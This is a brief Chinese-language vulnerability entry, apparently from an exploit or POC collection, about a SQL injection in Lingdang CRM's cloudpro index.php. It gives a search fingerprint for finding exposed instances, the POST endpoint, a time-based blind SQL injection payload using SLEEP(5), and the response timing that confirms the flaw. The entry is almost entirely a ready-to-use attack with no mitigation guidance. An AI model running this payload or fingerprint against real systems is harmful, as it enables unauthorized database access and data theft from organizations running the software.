# 灵当CRMcloudproindex.php存在SQL注入漏洞

灵当 ｜ SQL注入 ｜ —
- **指纹**：`body="crmcommon/js/jquery/jquery-1.10.1.min.js"`
- **请求**：`POST /crm/WeiXinApp/cloudpro/index.php HTTP/1.1`

**Payload**
```
action=getMyAccount&usid=1 AND (SELECT 5120 FROM (SELECT(SLEEP(5)))nmLt)
:---
```
- **响应特征**：200 响应时间>=5s